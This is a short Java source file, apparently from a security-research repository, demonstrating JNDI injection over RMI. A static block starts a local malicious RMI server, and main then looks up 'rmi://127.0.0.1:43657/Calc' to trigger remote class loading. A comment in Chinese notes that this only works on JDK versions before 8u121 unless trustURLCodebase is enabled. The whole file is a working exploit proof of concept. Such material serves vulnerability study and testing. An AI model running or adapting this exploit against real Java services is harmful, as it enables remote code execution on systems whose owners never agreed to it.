package com.threedr3am.bug.rmi.client;

import com.threedr3am.bug.common.server.RmiServer;
import javax.naming.InitialContext;
import javax.naming.NamingException;

/**
 * 在jdk8u121版本后，jdk加入了rmi远程代码信任机制，除非设置环境变量com.sun.jndi.rmi.object.trustURLCodebase为true，否则不会加载远程代码
 *
 * @author threedr3am
 */
public class JndiLookupForLeJdk8u121 {

  static {
    RmiServer.run();
  }

  public static void main(String[] args) {
    try {
      new InitialContext().lookup("rmi://127.0.0.1:43657/Calc");
    } catch (NamingException e) {
      e.printStackTrace();
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}
